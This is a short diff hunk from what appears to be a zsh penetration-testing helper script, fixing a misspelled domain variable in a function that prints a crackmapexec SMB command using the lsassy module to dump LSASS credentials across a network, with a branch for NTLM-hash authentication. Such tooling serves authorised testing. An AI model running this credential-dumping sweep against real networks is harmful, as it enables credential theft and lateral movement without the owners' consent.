@@ -145,7 +145,7 @@ nb-ad-pth-lsassy() {
         echo
         __ask "Enter a password for authentication"
         __check-pass
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIn} -p '${__PASS}' -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
